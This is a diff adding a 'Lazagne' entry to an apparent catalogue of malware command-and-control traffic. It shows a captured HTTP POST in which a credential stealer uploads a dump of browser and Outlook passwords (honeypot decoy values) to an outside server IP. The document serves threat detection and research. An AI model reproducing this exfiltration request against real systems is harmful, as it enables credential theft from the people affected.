@@ -837,6 +837,71 @@ id=01&message=test_message
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/krypton.png "KryptonStealer")
 
+#### Lazagne
+~~~
+POST /te.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------58748130728276
+User-Agent: Mozilla/5.0 Gecko/20100115 Firefox/3.6
+Host: 185.86.148.123
+Content-Length: 1526
+Cache-Control: no-cache
+
+-----------------------------58748130728276
+Content-Disposition: form-data; name="userfile"; filename="admin-USER-PC-passwords.txt"
+Content-Type:application/x-gzip
+
+
+
+
+########## User: admin ##########
+
+------------------- Firefox passwords -----------------
+
+[+] Password found !!!
+URL: https://m.facebook.com
+Login: honey@pot.com
+Password: honeypass356
+
+------------------- Outlook passwords -----------------
+
+[-] Password not found !!!
+Account Name: honey@pot.com.
+POP3 User: honey@pot.com.
+POP3 Server: 192.168.1.1.
+u'Delivery Store EntryID: \x00\x00\ua138\u10bb\ue505\u1a10\ubba1\x08\u2a2b\uc256\x00\u736d\u7370\u2e74\u6c64l\x00\x00\u494e\u4154\ubff9\u01b8\uaa00\u3700\u6ed9\x00\x00C:\\Users\\admin\\Documents\\Outlook Files\\honey@pot.com.pst\x00'
+SMTP Secure Connection: 0
+SMTP Server: 192.168.1.1.
+Mini UID: 224868084
+'Delivery Folder EntryID: \x00\x00\x00\x00\x81 \xa1\x9f\x92\x06>N\x9c\xc7t\xd9H\xba>f\x82\x80\x00\x00'
+u'clsid: \u457b\u3444\u3537\u3134\u2d31\u3042\u3644\u312d\u4431\u2d32\u4338\u4233\u302d\u3130\u3430\u3242\u3641\u3736\u7d36'
+Display Name: HoneyPot Mail.
+POP3 Password: honeypass356.
+Email: honey@pot.com.
+u'Leave on Server: \u3139\u3537\u3730'
+
+------------------- Google chrome passwords -----------------
+
+[+] Password found !!!
+URL: 
+Login: honey@pot.com
+Password: honeypass356
+
+
+[+] 3 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 0.84299993515
+
+-----------------------------58748130728276--
+
+HTTP/1.1 200 OK
+Date: Tue, 29 Oct 2019 21:10:11 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 1
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lazagne.png "Lazagne")
+
 #### Loda
 I've never seen this without the beta flah
 ~~~
